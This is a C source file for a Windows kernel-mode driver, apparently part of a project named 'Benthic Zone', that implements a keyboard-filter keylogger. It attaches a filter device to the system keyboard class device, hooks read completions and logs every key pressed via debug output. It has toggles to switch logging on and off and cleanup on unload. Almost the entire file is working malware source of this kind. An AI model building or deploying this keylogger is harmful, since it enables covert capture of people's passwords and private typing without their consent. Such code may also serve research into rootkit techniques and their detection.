// --------------------------------------------------------------------------------------------------------------------------------------------
// --------------------------------------------------------------------------------------------------------------------------------------------



// START -> LIBRARIES -------------------------------------------------------------------------------------------------------------------------
// START -> LIBRARIES -------------------------------------------------------------------------------------------------------------------------



// https://learn.microsoft.com/en-us/windows-hardware/drivers/ddi/ntddk/
// This header is used by kernel
#include <ntddk.h>



// START -> STRUCTURES ------------------------------------------------------------------------------------------------------------------------
// START -> STRUCTURES ------------------------------------------------------------------------------------------------------------------------



/**
	@brief      This structure is used as an extension to the device object for keyboard-related operations.


	@see        PDEVICE_OBJECT          https://learn.microsoft.com/en-us/windows-hardware/drivers/ddi/wdm/ns-wdm-_device_object
	@param      LowerKeyboardDevice     Pointer to the lower-level keyboard device object.
**/
typedef struct {
	PDEVICE_OBJECT	LowerKeyboardDevice;
} STRUCTURE_KEYBOARDKEYLOGGER_DEVICE_EXTENSION, * PSTRUCTURE_KEYBOARDKEYLOGGER_DEVICE_EXTENSION;
// https://doxygen.reactos.org/da/db3/struct____DEVICE__EXTENSION____.html



/**
	@brief      This structure represents information related to keyboard input events.


	@see        USHORT                  https://learn.microsoft.com/en-us/windows/win32/winprog/windows-data-types#USHORT
	@param      UnitId                  Specifies the unit number of a keyboard device. A keyboard device name has the format \Device\KeyboardPortN, where the suffix N is the unit number of the device. For example, a device, whose name is \Device\KeyboardPort0, has a unit number of zero, and a device, whose name is \Device\KeyboardPort1, has a unit number of one.

	@see        USHORT                  https://learn.microsoft.com/en-us/windows/win32/winprog/windows-data-types#USHORT
	@param      MakeCode                Specifies the scan code associated with a key press.

	@see        USHORT                  https://learn.microsoft.com/en-us/windows/win32/winprog/windows-data-types#USHORT
	@param      Flags                   Specifies a bitwise OR of one or more of the following flags that indicate whether a key was pressed or released, and other miscellaneous information.

	@see        USHORT                  https://learn.microsoft.com/en-us/windows/win32/winprog/windows-data-types#USHORT
	@param      Reserved                Reserved for operating system use.

	@see        USHORT                  https://learn.microsoft.com/en-us/windows/win32/winprog/windows-data-types#ULONG
	@param      ExtraInformation        Specifies device-specific information associated with a keyboard event.
**/
typedef struct _STRUCTURE_KEYBOARDFILTER_KEYBOARD_INPUT_DATA {
	USHORT		UnitId;
	USHORT		MakeCode;
	USHORT		Flags;
	USHORT		Reserved;
	ULONG		ExtraInformation;
} STRUCTURE_KEYBOARDFILTER_KEYBOARD_INPUT_DATA, * PSTRUCTURE_KEYBOARDFILTER_KEYBOARD_INPUT_DATA;
// https://learn.microsoft.com/en-us/windows/win32/api/ntddkbd/ns-ntddkbd-STRUCTURE_KEYBOARDFILTER_KEYBOARD_INPUT_DATA



// START -> GLOBAL VARIABLES ------------------------------------------------------------------------------------------------------------------
// START -> GLOBAL VARIABLES ------------------------------------------------------------------------------------------------------------------



// Global flag to enable or disable keylogging
BOOLEAN Global_KeyboardFilter_KeyloggerEnabled = FALSE;

// Pointer to device object for keyboard driver
PDEVICE_OBJECT Global_KeyboardFilter_KeyboardDevice = NULL;

// Counter to track the number of pending keyboard input events
ULONG Global_KeyboardFilter_PendingKey = 0;

// Global table for mapping keyboard scan codes (0–255) to their ASCII-equivalent key labels
static const char* Global_KeyboardFilter_ScanCodeToAscii[256] = {
	"", "Esc", "1", "2", "3", "4", "5", "6", "7", "8", "9", "0", "-", "=", "Backspace", "Tab", "Q", "W", "E", "R", "T", "Y", "U", "I", "O", "P", "[", "]", "Enter", "Ctrl", "A", "S", "D", "F", "G", "H", "J", "K", "L", ";", "'", "`", "Shift", "\\", "Z", "X", "C", "V", "B", "N", "M", ",", ".", "/", "Shift", "*", "Alt", "Space", "CapsLock", "F1", "F2", "F3", "F4", "F5", "F6", "F7", "F8", "F9", "F10", "NumLock", "ScrollLock", "Home", "Up", "PgUp", "-", "Left", "Center", "Right", "+", "End", "Down", "PgDn", "Insert", "Delete"
};



// START -> FUNCTIONS -------------------------------------------------------------------------------------------------------------------------
// START -> FUNCTIONS -------------------------------------------------------------------------------------------------------------------------



/**
	@brief      Enables the keylogger by setting the flag.
**/
VOID
TechniquesKeyboardFilter_KeyloggerOn()
{
	// ---------------------------------------------------------------------------------------------------------------------
	// Global variable
	Global_KeyboardFilter_KeyloggerEnabled = TRUE;


	// ---------------------------------------------------------------------------------------------------------------------
	// Message
	DbgPrint("Benthic Zone -> KernelModeDriver [Techniques/KeyboardFilter.c] (KeyloggerOn) - Keylogger is now ON");
}



/**
	@brief      Disables the keylogger by clearing the flag.
**/
VOID
TechniquesKeyboardFilter_KeyloggerOff()
{
	// ---------------------------------------------------------------------------------------------------------------------
	// Global variable
	Global_KeyboardFilter_KeyloggerEnabled = FALSE;


	// ---------------------------------------------------------------------------------------------------------------------
	// Message
	DbgPrint("Benthic Zone -> KernelModeDriver [Techniques/KeyboardFilter.c] (KeyloggerOff) - Keylogger is now OFF");
}



/**
	@brief      Callback function invoked upon completion of a read operation.


	@see        PDEVICE_OBJECT          https://learn.microsoft.com/en-us/windows-hardware/drivers/ddi/wdm/ns-wdm-_device_object
	@param[in]  pDeviceObject           Pointer to a DEVICE_OBJECT structure representing the device.

	@see        PIRP                    https://learn.microsoft.com/en-us/windows-hardware/drivers/ddi/wdm/ns-wdm-_irp
	@param[in]  pIrp                    Pointer to an IRP (I/O request packet) for the read operation.

	@see        PVOID                   https://learn.microsoft.com/en-us/windows/win32/winprog/windows-data-types#PVOID
	@param[in]  pcontext                User-defined context parameter.


	@return     A NTSTATUS value indicating success or an error code if operation fails.
**/
NTSTATUS
TechniquesKeyboardFilter_KeyloggerCompletionRoutine(
	_In_        PDEVICE_OBJECT          pDeviceObject,
	_In_        PIRP                    pIrp,
	_In_        PVOID                   pcontext
)
{
	// ---------------------------------------------------------------------------------------------------------------------
	// Preventing compiler warnings for unused parameter.
	UNREFERENCED_PARAMETER(pDeviceObject);
	UNREFERENCED_PARAMETER(pcontext);


	// ---------------------------------------------------------------------------------------------------------------------
	// Pointer to the buffer containing keyboard input data
	// https://learn.microsoft.com/en-us/windows/win32/api/ntddkbd/ns-ntddkbd-STRUCTURE_KEYBOARDFILTER_KEYBOARD_INPUT_DATA
	PSTRUCTURE_KEYBOARDFILTER_KEYBOARD_INPUT_DATA keys = (PSTRUCTURE_KEYBOARDFILTER_KEYBOARD_INPUT_DATA)pIrp->AssociatedIrp.SystemBuffer;


	// ---------------------------------------------------------------------------------------------------------------------
	// Calculate the number of keyboard input data structures in the buffer
	ULONG_PTR structnum = pIrp->IoStatus.Information / sizeof(STRUCTURE_KEYBOARDFILTER_KEYBOARD_INPUT_DATA);


	// ---------------------------------------------------------------------------------------------------------------------
	// Check if read operation was successful
	if (pIrp->IoStatus.Status == STATUS_SUCCESS && Global_KeyboardFilter_KeyloggerEnabled)
	{

		// -----------------------------------------------------------------------------------------------------------------
		// Iterate through keyboard input data
		for (int i = 0; i < structnum; i++)
		{
			// KeyDown event
			if (keys[i].Flags == 0)
			{
				// United States-International Layout Scancodes
				// https://kbdlayout.info/kbdusx/scancodes
				UCHAR scanCode = (UCHAR)(keys[i].MakeCode & 0xFF);
				
				// Print the corresponding character
				if (scanCode < 256)
				{
					DbgPrint("Benthic Zone -> KernelModeDriver [Techniques/KeyboardFilter.c] (DriverCompletionRoutine) - Keylogger captured -> %s\n", Global_KeyboardFilter_ScanCodeToAscii[scanCode]);
				}
				else
				{
					DbgPrint("Benthic Zone -> KernelModeDriver [Techniques/KeyboardFilter.c] (DriverCompletionRoutine) - Keylogger captured unknown keycode -> %x\n", scanCode);
				}
			}
		}
	}


	// ---------------------------------------------------------------------------------------------------------------------
	// Mark IRP as pending if it was pending
	if (pIrp->PendingReturned)
	{
		// The IoMarkIrpPending routine marks the specified IRP, indicating that a driver's dispatch routine subsequently returned STATUS_PENDING because further processing is required by other driver routines.
		// https://learn.microsoft.com/en-us/windows-hardware/drivers/ddi/wdm/nf-wdm-iomarkirppending
		IoMarkIrpPending(pIrp);
	}


	// ---------------------------------------------------------------------------------------------------------------------
	// Decrement the Global_KeyboardFilter_PendingKey count
	Global_KeyboardFilter_PendingKey--;


	// ---------------------------------------------------------------------------------------------------------------------
	// Return the status of the read operation
	return pIrp->IoStatus.Status;
}



/**
	@brief      Function to read keystrokes from keyboard device.


	@see        PDEVICE_OBJECT          https://learn.microsoft.com/en-us/windows-hardware/drivers/ddi/wdm/ns-wdm-_device_object
	@param[in]  pDeviceObject           Pointer to a DEVICE_OBJECT structure representing the device.

	@see        PIRP                    https://learn.microsoft.com/en-us/windows-hardware/drivers/ddi/wdm/ns-wdm-_irp
	@param[in]  pIrp                    Pointer to the I/O request packet (IRP) for reading keystrokes.


	@return     A NTSTATUS value indicating success or an error code if operation fails.
**/
NTSTATUS
TechniquesKeyboardFilter_KeyloggerReadKeystrokes(
	_In_        PDEVICE_OBJECT          pDeviceObject,
	_In_        PIRP                    pIrp
)
{
	// ---------------------------------------------------------------------------------------------------------------------
	// Copy current IRP stack location to next stack location

	// The IoCopyCurrentIrpStackLocationToNext routine copies the IRP stack parameters from the current I/O stack location to the stack location of the next-lower driver.
	// https://learn.microsoft.com/en-us/windows-hardware/drivers/ddi/wdm/nf-wdm-iocopycurrentirpstacklocationtonext
	IoCopyCurrentIrpStackLocationToNext(pIrp);


	// ---------------------------------------------------------------------------------------------------------------------
	// Set completion routine for IRP

	// The IoSetCompletionRoutine routine registers an IoCompletion routine, which will be called when the next-lower-level driver has completed the requested operation for the given IRP.
	// https://learn.microsoft.com/en-us/windows-hardware/drivers/ddi/wdm/nf-wdm-iosetcompletionroutine
	IoSetCompletionRoutine(pIrp, TechniquesKeyboardFilter_KeyloggerCompletionRoutine, NULL, TRUE, TRUE, TRUE);


	// ---------------------------------------------------------------------------------------------------------------------
	// Increment Global_KeyboardFilter_PendingKey count to track pending read operations
	Global_KeyboardFilter_PendingKey++;


	// ---------------------------------------------------------------------------------------------------------------------
	// Forward IRP to lower-level keyboard device driver

	// The IoCallDriver routine, wraps IofCallDriver that sends an IRP to the driver associated with a specified device object.
	// https://learn.microsoft.com/en-us/windows-hardware/drivers/ddi/wdm/nf-wdm-iocalldriver
	return IoCallDriver(((PSTRUCTURE_KEYBOARDKEYLOGGER_DEVICE_EXTENSION)pDeviceObject->DeviceExtension)->LowerKeyboardDevice, pIrp);
}



/**
	@brief      Attaches the keyboard device to the driver.


	@see        PDEVICE_OBJECT          https://learn.microsoft.com/en-us/windows-hardware/drivers/ddi/wdm/ns-wdm-_driver_object
	@param[in]  pDriverObject           Pointer to a DRIVER_OBJECT structure representing the driver's image in the operating system kernel.


	@return     A NTSTATUS value indicating success or an error code if operation fails.
**/
NTSTATUS
TechniquesKeyboardFilter_KeyloggerAttachKeyboard(
	_In_        PDRIVER_OBJECT          pDriverObject
)
{
	// ---------------------------------------------------------------------------------------------------------------------
	// Variables
	NTSTATUS status;
	UNICODE_STRING targetDevice = RTL_CONSTANT_STRING(L"\\Device\\KeyboardClass0");


	// ---------------------------------------------------------------------------------------------------------------------
	// Hello
	DbgPrint("Benthic Zone -> KernelModeDriver [Techniques/KeyboardFilter.c] (KeyloggerAttachKeyboard) - Hello");


	// ---------------------------------------------------------------------------------------------------------------------
	// Create a device object for the keyboard
	DbgPrint("Benthic Zone -> KernelModeDriver [Techniques/KeyboardFilter.c] (KeyloggerAttachKeyboard) - Create a device object for the keyboard");

	// The IoCreateDevice routine creates a device object for use by a driver.
	// https://learn.microsoft.com/en-us/windows-hardware/drivers/ddi/wdm/nf-wdm-iocreatedevice
	status = IoCreateDevice(pDriverObject, sizeof(STRUCTURE_KEYBOARDKEYLOGGER_DEVICE_EXTENSION), NULL, FILE_DEVICE_KEYBOARD, 0, FALSE, &Global_KeyboardFilter_KeyboardDevice);
	if (!NT_SUCCESS(status))
	{
		DbgPrint("Benthic Zone -> KernelModeDriver [Techniques/KeyboardFilter.c] (KeyloggerAttachKeyboard) - ERROR: Error creating device for keyboard (Status 0x%08X).\n", status);
		return status;
	}


	// ---------------------------------------------------------------------------------------------------------------------
	// Set DO_BUFFERED_IO flag

	// After attaching a legacy filter device object to a file system or volume, always set or clear the DO_BUFFERED_IO and DO_DIRECT_IO flags as needed so that they match the values of the next-lower device object on the driver stack. For more information about these flags, see Methods for Accessing Data Buffers (https://learn.microsoft.com/en-us/windows-hardware/drivers/kernel/methods-for-accessing-data-buffers).
	// https://learn.microsoft.com/en-us/windows-hardware/drivers/ifs/propagating-the-do-buffered-io-and-do-direct-io-flags
	Global_KeyboardFilter_KeyboardDevice->Flags |= DO_BUFFERED_IO;


	// ---------------------------------------------------------------------------------------------------------------------
	// Clear DO_DEVICE_INITIALIZING

	// After attaching a legacy filter device object to a file system or volume, always be sure to clear the DO_DEVICE_INITIALIZING flag on the filter device object. (For more information about this flag, see DEVICE_OBJECT in the Kernel Reference https://learn.microsoft.com/en-us/windows-hardware/drivers/ddi/wdm/ns-wdm-_device_object). When the filter device object is created, IoCreateDevice sets the DO_DEVICE_INITIALIZING flag on the device object. After the filter is successfully attached, this flag must be cleared. If this flag isn't cleared, no more filter drivers can attach to the filter chain because the call to IoAttachDeviceToDeviceStackSafe will fail. It isn't necessary to clear the DO_DEVICE_INITIALIZING flag on device objects that are created in DriverEntry, because the I/O Manager automatically clears it. However, your driver should clear this flag on all other device objects that it creates.
	// https://learn.microsoft.com/en-us/windows-hardware/drivers/ifs/clearing-the-do-device-initializing-flag
	Global_KeyboardFilter_KeyboardDevice->Flags &= ~DO_DEVICE_INITIALIZING;


	// ---------------------------------------------------------------------------------------------------------------------
	// Clear device extension

	// The RtlZeroMemory routine fills a block of memory with zeros, given a pointer to the block and the length, in bytes, to be filled.
	// https://learn.microsoft.com/en-us/windows-hardware/drivers/ddi/wdm/nf-wdm-rtlzeromemory
	RtlZeroMemory(Global_KeyboardFilter_KeyboardDevice->DeviceExtension, sizeof(STRUCTURE_KEYBOARDKEYLOGGER_DEVICE_EXTENSION));


	// ---------------------------------------------------------------------------------------------------------------------
	// Attach keyboard device to driver

	// The IoAttachDevice routine attaches the caller's device object to a named target device object, so that I/O requests bound for the target device are routed first to the caller.
	// https://learn.microsoft.com/en-us/windows-hardware/drivers/ddi/wdm/nf-wdm-ioattachdevice
	status = IoAttachDevice(Global_KeyboardFilter_KeyboardDevice, &targetDevice, &((PSTRUCTURE_KEYBOARDKEYLOGGER_DEVICE_EXTENSION)Global_KeyboardFilter_KeyboardDevice->DeviceExtension)->LowerKeyboardDevice);
	if (!NT_SUCCESS(status))
	{
		// Cleanup and delete device object if attachment fails
		// The IoDeleteDevice routine removes a device object from the system, for example, when the underlying device is removed from the system.
		// https://learn.microsoft.com/en-us/windows-hardware/drivers/ddi/wdm/nf-wdm-iodeletedevice
		IoDeleteDevice(Global_KeyboardFilter_KeyboardDevice);
		DbgPrint("Benthic Zone -> KernelModeDriver [Techniques/KeyboardFilter.c] (KeyloggerAttachKeyboard) - ERROR: Failed to attach to target keyboard device (Status 0x%08X).\n", status);
		return status;
	}


	// ---------------------------------------------------------------------------------------------------------------------
	// Bye
	DbgPrint("Benthic Zone -> KernelModeDriver [Techniques/KeyboardFilter.c] (KeyloggerAttachKeyboard) - Bye");


	// ---------------------------------------------------------------------------------------------------------------------
	// Return
	return STATUS_SUCCESS;
}



/**
	@brief      Cleans up and detaches the keyboard keylogger driver.
**/
VOID
TechniquesKeyboardFilter_Unload()
{
	// ---------------------------------------------------------------------------------------------------------------------
	// Hello
	DbgPrint("Benthic Zone -> KernelModeDriver [Techniques/KeyboardFilter.c] (Unload) - Hello");


	// ---------------------------------------------------------------------------------------------------------------------
	// Detach from lower keyboard device

	// First, check if our filter device was successfully created and initialized
	if (Global_KeyboardFilter_KeyboardDevice)
	{

		// -----------------------------------------------------------------------------------------------------------------
		// Retrieve the device extension that holds the pointer to the lower device object
		PSTRUCTURE_KEYBOARDKEYLOGGER_DEVICE_EXTENSION extension = (PSTRUCTURE_KEYBOARDKEYLOGGER_DEVICE_EXTENSION)Global_KeyboardFilter_KeyboardDevice->DeviceExtension;


		// -----------------------------------------------------------------------------------------------------------------
		// Ensure that the extension and the lower keyboard device are valid before proceeding
		if (extension && extension->LowerKeyboardDevice)
		{
			DbgPrint("Benthic Zone -> KernelModeDriver [Techniques/KeyboardFilter.c] (Unload) - Detaching from lower keyboard device");
			// The IoDetachDevice routine releases an attachment between the caller's device object and a lower driver's device object.
			// https://learn.microsoft.com/en-us/windows-hardware/drivers/ddi/wdm/nf-wdm-iodetachdevice
			IoDetachDevice(extension->LowerKeyboardDevice);
		}
	}


	// ---------------------------------------------------------------------------------------------------------------------
	// Wait for pending key events to complete
	DbgPrint("Benthic Zone -> KernelModeDriver [Techniques/KeyboardFilter.c] (Unload) - Waiting for pending keystrokes...");

	// If any keystroke processing is still pending, wait in a loop before unloading (This helps avoid race conditions with callback routines still being invoked)
	LARGE_INTEGER interval;
	interval.QuadPart = -10 * 1000 * 1000;


	// ---------------------------------------------------------------------------------------------------------------------
	// Loop
	while (Global_KeyboardFilter_PendingKey)
	{

		// -----------------------------------------------------------------------------------------------------------------
		// Put the current thread into a sleep

		// The KeDelayExecutionThread routine puts the current thread into an alertable or nonalertable wait state for a specified interval.
		// https://learn.microsoft.com/en-us/windows-hardware/drivers/ddi/wdm/nf-wdm-kedelayexecutionthread
		KeDelayExecutionThread(KernelMode, FALSE, &interval);
	}


	// ---------------------------------------------------------------------------------------------------------------------
	// Delete the filter device object

	// After detaching and waiting for pending operations, it's safe to delete the device object
	if (Global_KeyboardFilter_KeyboardDevice)
	{

		// -----------------------------------------------------------------------------------------------------------------
		// Delete device
		DbgPrint("Benthic Zone -> KernelModeDriver [Techniques/KeyboardFilter.c] (Unload) - Deleting keyboard filter device");


		// -----------------------------------------------------------------------------------------------------------------
		// Remove the device from the system

		// The IoDeleteDevice routine removes a device object from the system, for example, when the underlying device is removed from the system.
		// https://learn.microsoft.com/en-us/windows-hardware/drivers/ddi/wdm/nf-wdm-iodeletedevice
		IoDeleteDevice(Global_KeyboardFilter_KeyboardDevice);


		// -----------------------------------------------------------------------------------------------------------------
		// Clear the global pointer
		Global_KeyboardFilter_KeyboardDevice = NULL;
	}


	// ---------------------------------------------------------------------------------------------------------------------
	// Bye
	DbgPrint("Benthic Zone -> KernelModeDriver [Techniques/KeyboardFilter.c] (Unload) - Bye");
}



// --------------------------------------------------------------------------------------------------------------------------------------------
// --------------------------------------------------------------------------------------------------------------------------------------------
